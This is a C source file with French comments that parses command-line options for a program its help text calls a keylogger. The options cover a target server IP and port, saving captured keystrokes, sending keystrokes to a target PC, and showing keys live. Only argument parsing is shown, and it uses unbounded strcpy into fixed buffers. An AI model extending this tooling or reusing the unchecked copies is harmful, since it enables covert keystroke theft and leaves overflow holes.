/***********************************************************************
* FILENAME :  parser.c
*
* DESCRIPTION :
*       Ce fichier contient la declaration des fonctions qui permmettent
*       de recuperer les parametres que l'utilisateur transmet pour
*       utiliser ce code.
*
* AUTHOR :    Yanis GENY          START DATE :    20 Jan 2024
************************************************************************/

#include "headers/parser.h"

struct parser_t parser = {0x00, {0}, {0}, {0}, 0};

/*
*  search_parser permet de recuperer les parametres donnes dans les arguments
*  lors de l'execution du programme. les differents parametre seront renseigner
*  dans la structure (struct parser_t parser) en varaible global.
*
*  input :
*    int argc    -> nombre de parametre
*    char **argv -> tableau contenant les parametres
*
*  output:
*    _BAD_PARAM_ -> si un parametre n'est pas identifiable
*    _SUCCESS_   -> si pas d'erreur de detection des parametres
*/
int search_parser(const int argc, char **argv) {
	int i=0;
	int flag_found;

	if (argc <= 1) parser.parser |= PARSER_FLAG_HELP;

	while(++i < argc) {
		flag_found = 0;
		// parser du manuel du programme
		if ((!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) && !flag_found) {
			parser.parser |= PARSER_FLAG_HELP;
			flag_found = 1;
		}
		// parser qui permet d'afficher les touches sur le terminal
		if ((!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose")) && !flag_found) {
			parser.parser |= PARSER_FLAG_VERBOSE;
			flag_found = 1;
		}
		// parser qui permet d'avoir un fichier d'enregistrement des touches
		if ((!strcmp(argv[i], "-o") || !strcmp(argv[i], "--output")) && !flag_found) {
			parser.parser |= PARSER_FLAG_OUTPUT;
			strcpy(parser.output, argv[++i]); // recuperation du nom du fichier
			flag_found = 1;
		}
		// parser qui permet de donner des touches a transmettre
		if ((!strcmp(argv[i], "-i") || !strcmp(argv[i], "--input")) && !flag_found) {
			parser.parser |= PARSER_FLAG_INTPUT;
			strcpy(parser.input, argv[++i]); // recuperation du nom du fichier
			flag_found = 1;
		}
		// parser qui donne l'ip du serveur
		if ((!strcmp(argv[i], "-t") || !strcmp(argv[i], "--target")) && !flag_found) {
			parser.parser |= PARSER_FLAG_TARGET;
			strcpy(parser.target, argv[++i]); // recuperation du nom du fichier
			flag_found = 1;
		}
		// parser qui donne le port du serveur
		if ((!strcmp(argv[i], "-p") || !strcmp(argv[i], "--port")) && !flag_found) {
			parser.parser |= PARSER_FLAG_PORT;
			parser.port = atoi(argv[++i]); // recuperation du nom du fichier
			flag_found = 1;
		}

		// Si pas de parametre valide arret du programme avec affichage du man
		if (!flag_found) {
			parser.parser |= PARSER_FLAG_HELP;
			return _BAD_PARAM_;
		}

	}

	if ((parser.parser & PARSER_FLAG_TARGET) != PARSER_FLAG_TARGET ||
		(parser.parser & PARSER_FLAG_PORT) != PARSER_FLAG_PORT        )
		parser.parser |= PARSER_FLAG_HELP;

	return _SUCCESS_;
}

/*
*  parser_man permet d'afficher le manuel d'utilisation du programme
*
*  input : none
*
*  output: none
*/
void parser_man(int genByError) {
	if (genByError) {
		printf("%s**ERROR: Bag argument.%s\n", RED, DEFAULT_COLOR);
		printf("Suivez le manuel\n\n");
	}
	printf("%sManuel d'utilisation%s\n\n", CYAN, DEFAULT_COLOR);
	printf("\t%s-t <IP SRV>, --target <IP SRV> :%s permet de donner l'ip du serveur du keylogger\n", YELLOW, DEFAULT_COLOR);
	printf("\t                                 se parametre est %sobligatoire%s\n", RED, DEFAULT_COLOR);
	printf("\t%s-p <PORT>, --port <PORT>       :%s pour donner le port d'ecoute du serveur\n", YELLOW, DEFAULT_COLOR);
	printf("\t                                 se parametre est %sobligatoire%s\n", RED, DEFAULT_COLOR);
	printf("\n");
	printf("\t%s-o <FILE>, --output <FILE>     :%s permet de renseigner un fichier pour sauvegarder\n", YELLOW, DEFAULT_COLOR);
	printf("\t                                 les touches du keylogger\n");
	printf("\t%s-i <FILE>, --input <FILE>      :%s permet de renseigner un fichier qui contient des\n", YELLOW, DEFAULT_COLOR);
	printf("\t                                  des touches a transmettre au PC cible\n");
	printf("\n");
	printf("\t%s-v, --verbose                  :%s pour afficher sur le terminal les touches en direct\n", YELLOW, DEFAULT_COLOR);
	printf("\t%s-h, --help                     :%s pour afficher ce man\n", YELLOW, DEFAULT_COLOR);
}